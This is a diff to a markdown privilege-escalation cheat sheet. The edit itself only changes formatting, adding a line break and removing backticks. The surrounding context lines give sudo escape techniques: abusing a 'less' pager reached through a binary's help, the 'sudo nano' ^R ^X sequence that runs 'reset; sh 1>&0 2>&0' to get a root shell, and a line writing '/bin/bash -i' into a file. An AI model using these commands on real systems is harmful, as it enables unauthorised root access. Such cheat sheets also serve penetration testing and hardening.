@@ -2,7 +2,7 @@
 [< Back to Menu](README.md)
 <!-- ------------------------------------------- -->
 ## help
-Any binary that support `help` and utilize `less` pager can be elevated privilege.
+Any binary that support `help` and utilize `less` pager can be elevated privilege.<br>
 Prerequisite: `help` with `less` pager
 ```bash
 sudo some_binary help
@@ -27,7 +27,7 @@ echo "/bin/bash -i >> /home/anyfile.sh"
 sudo nano
 ^R
 ^X
-`reset; sh 1>&0 2>&0`
+reset; sh 1>&0 2>&0
 ```
 <!-- ------------------------------------------- -->
 ## find
